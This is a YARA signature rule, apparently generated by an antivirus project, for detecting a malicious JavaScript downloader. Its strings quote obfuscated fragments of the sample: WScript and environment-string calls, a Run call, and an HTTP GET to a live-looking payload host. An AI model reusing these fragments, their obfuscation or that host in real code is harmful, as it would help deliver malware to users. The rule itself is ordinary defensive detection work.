rule sig_20160428_0745e253661aea09efa3260eaf4db580 {
  meta:
    description = "datamaliciousorder - file 20160428_0745e253661aea09efa3260eaf4db580.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bd4537cdae7d5823e9a8bb26e9240eb435f2a0e01b1b9b7ba7c348e534e3a03e"

  strings:
    $s1  = "function DllMutPwuEdvDrhNrvQcd() {return UmtPmqCorIagHswHafUxn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function DllMutPwuEdvDrhNrvQcd() {return UmtPmqCorIagHswHafUxn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function IzeXoiBpcTvcYcwEmnEao(BhhDmrUsiBomVnvTgjGru){UmtPmqCorIagHswHafUxn[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function IzeXoiBpcTvcYcwEmnEao(BhhDmrUsiBomVnvTgjGru){UmtPmqCorIagHswHafUxn[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "function UhnNylUjjEhzJucZxoDrr(EmjLdhUsqFenWobPvkYoq, KimSiqAcrCyhXdkOapTxx){RovXeuRblAiuHbkDwnAbk = RovXeuRblAiuHbkDwnAbk * 1; " ascii
    $s6  = "return EmjLdhUsqFenWobPvkYoq - KimSiqAcrCyhXdkOapTxx;};" fullword ascii
    $s7  = "RaeQmwXmvMbfIviLdaOgs[KvqUhtYigVsjMjqEueJlo](\"G\" + \"ET\", \"http://sarsudexpert.ru/q2ikcxz\", false);" fullword ascii
    $s8  = "var UmtPmqCorIagHswHafUxn = function NjgFtaUygPcnSfzPfnVbp() {return YmhRjcAqwLhqMsiZuoHwk[PwnIbzWnbKgmRznYtcXtq](\"WScript\"+\"" ascii
    $s9  = "function UhnNylUjjEhzJucZxoDrr(EmjLdhUsqFenWobPvkYoq, KimSiqAcrCyhXdkOapTxx){RovXeuRblAiuHbkDwnAbk = RovXeuRblAiuHbkDwnAbk * 1; " ascii
    $s10 = "function FueAjdScbYajVnaSufYkb(){return LhtEaoDlpIrtXrxFiyCna + \"\";};" fullword ascii
    $s11 = "if (RaeQmwXmvMbfIviLdaOgs[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function HaoBxzPeqQfpQtqOamDrf() {return ((UnuFwnXamYqzXucGfrXwm == true) && (UnuFwnXamYqzXucGfrXwm == TkcQcoDbeMevVbtEcxKtq)) ?" ascii
    $s13 = "function HaoBxzPeqQfpQtqOamDrf() {return ((UnuFwnXamYqzXucGfrXwm == true) && (UnuFwnXamYqzXucGfrXwm == TkcQcoDbeMevVbtEcxKtq)) ?" ascii
    $s14 = "var YmhRjcAqwLhqMsiZuoHwk = this[\"WScript\"];" fullword ascii
    $s15 = "var UmtPmqCorIagHswHafUxn = function NjgFtaUygPcnSfzPfnVbp() {return YmhRjcAqwLhqMsiZuoHwk[PwnIbzWnbKgmRznYtcXtq](\"WScript\"+\"" ascii
    $s16 = "function DzfVlhAgfCllJfbNivGlf(){return 23;};" fullword ascii
    $s17 = "return UhnNylUjjEhzJucZxoDrr(1 == 1 ? VjwVwbPeqNpvVqjUjbIgd : 0, 1 == 1 ? GbmWemHtnXsbYuhKuoXod : 0);" fullword ascii
    $s18 = "var TkcQcoDbeMevVbtEcxKtq = false;" fullword ascii
    $s19 = "}while (IcpFvhLzpNwkJaqDnxXse);" fullword ascii
    $s20 = "var YvjEgxUziLkqLmdAxeKkf = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}